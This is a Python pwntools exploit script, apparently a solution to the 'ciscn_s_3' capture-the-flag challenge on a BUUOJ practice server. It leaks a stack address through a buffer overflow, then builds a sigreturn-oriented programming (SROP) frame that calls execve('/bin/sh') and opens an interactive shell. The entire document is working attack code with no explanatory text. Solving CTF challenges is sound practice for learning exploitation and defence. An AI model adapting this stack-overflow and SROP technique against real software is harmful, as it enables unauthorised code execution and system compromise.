from pwn import *
from time import *
context.binary = './ciscn_s_3'
context.log_level = 'debug'
context.timeout = None
elf = context.binary



def dbg():
	raw_input()

if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20154)
	libc = ELF('../x64_libc.so.6')
else:
	libc = context.binary.libc
	p = process('./ciscn_s_3')
	gdb.attach(p, 'b* 0x400519')
	dbg()



syscall = 0x400517 			#syscall; ret
pop_rdi = 0x4005a3			#pop rdi; ret
pop_rsi = 0x4005a1			#pop rsi,; pop r15; ret

main = 0x4004F1
fake_call = 0x4004E1
data = 0x601020

mov_eax_0 = 0x400425 		#mov eax, 0; pop rbp, ret
rt_sigreturn = 0x4004DA 		#mov eax, 0xf; ret
mov_eax_3b = 0x4004e2		#mov eax, 0x3b; ret

rop_init = 0x40059a
mov_call = 0x400580


payload = "/bin/sh\x00"
payload += '\x00' * 8
payload += p64(main)
p.send(payload)					#write(1, stack_addr, 0x30)
								#will leak an address on stack
p.recv(32)

stack_addr = u64(p.recv(8)) - 0x118	#rsi
print "stack_addr ==> " + hex(stack_addr)

p.recv(8)

#SROP Attack
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = stack_addr					#&'/bin/sh'
frame.rsi = 0
frame.rdx = 0
frame.rsp = stack_addr + 0x8
frame.rip = syscall

payload = 'a'*0x10

payload += p64(rt_sigreturn)
payload += p64(syscall)			#sigreturn
payload += str(frame)			#fake frame

p.send(payload)
print "frame ==> "

frame = str(frame)
i = 0
while i < len(frame)-8:
	print hex(u64(frame[i:i+8]))
	i += 8

p.interactive()
p.close()